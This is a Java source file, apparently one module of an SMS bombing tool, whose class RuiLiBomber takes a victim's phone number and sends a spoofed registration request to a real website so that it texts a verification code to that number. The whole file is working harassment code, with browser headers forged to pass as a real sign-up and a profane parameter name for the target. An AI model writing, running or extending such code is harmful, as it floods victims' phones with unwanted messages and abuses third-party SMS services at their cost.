package com.utils.attack;

import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.message.BasicHeader;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by fz on 2015/8/23.
 */
public class RuiLiBomber implements MessageBomber{

    public String name;

    public RuiLiBomber(String name){
        this.name = name;
    }

    @Override
    public String emissionMissile(CloseableHttpClient httpClient, String fuckNo) throws Exception {

        HttpPost httpPost = new HttpPost("http://user.rayli.com.cn/forum.php?mod=ajax&infloat=register&handlekey=register&action=dsmscode&fbry=21658YemE7255Xjsy33652&ajaxmenu=1&stype=register&mobile="+fuckNo+"&inajax=1&ajaxtarget=smscode_tip");

        List<NameValuePair> pairs = new ArrayList<NameValuePair>();
        pairs.add(new BasicNameValuePair("mod", "ajax"));
        pairs.add(new BasicNameValuePair("infloat", "register"));
        pairs.add(new BasicNameValuePair("handlekey", "register"));
        pairs.add(new BasicNameValuePair("action", "dsmscode"));
        pairs.add(new BasicNameValuePair("fbry", "21658YemE7255Xjsy33652"));
        pairs.add(new BasicNameValuePair("ajaxmenu", "1"));
        pairs.add(new BasicNameValuePair("stype", "register"));
        pairs.add(new BasicNameValuePair("mobile", fuckNo));
        pairs.add(new BasicNameValuePair("inajax", "1"));
        pairs.add(new BasicNameValuePair("ajaxtarget", "smscode_tip"));

        UrlEncodedFormEntity uefEntity = new UrlEncodedFormEntity(pairs, "utf-8");

        httpPost.setHeader(new BasicHeader("Accept", "*/*"));
        httpPost.setHeader(new BasicHeader("Accept-Encoding", "gzip, deflate, sdch"));
        httpPost.setHeader(new BasicHeader("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2"));
        httpPost.setHeader(new BasicHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"));
        httpPost.setHeader(new BasicHeader("DNT", "1"));
        httpPost.setHeader(new BasicHeader("Host", "user.rayli.com.cn"));
        httpPost.setHeader(new BasicHeader("Referer", "http://user.rayli.com.cn/member-register.html"));
        httpPost.setHeader(new BasicHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"));
        httpPost.setHeader(new BasicHeader("X-Requested-With", "XMLHttpRequest"));

        httpPost.setEntity(uefEntity);
        CloseableHttpResponse httpResponse = httpClient.execute(httpPost);

        HttpEntity entity = httpResponse.getEntity();
        String result = null;
        if (entity != null){
            result = EntityUtils.toString(entity, "utf-8");
        }

        EntityUtils.consume(entity);
        httpResponse.close();
        return result;
    }

    @Override
    public String getBomberName() {
        return this.name;
    }
}
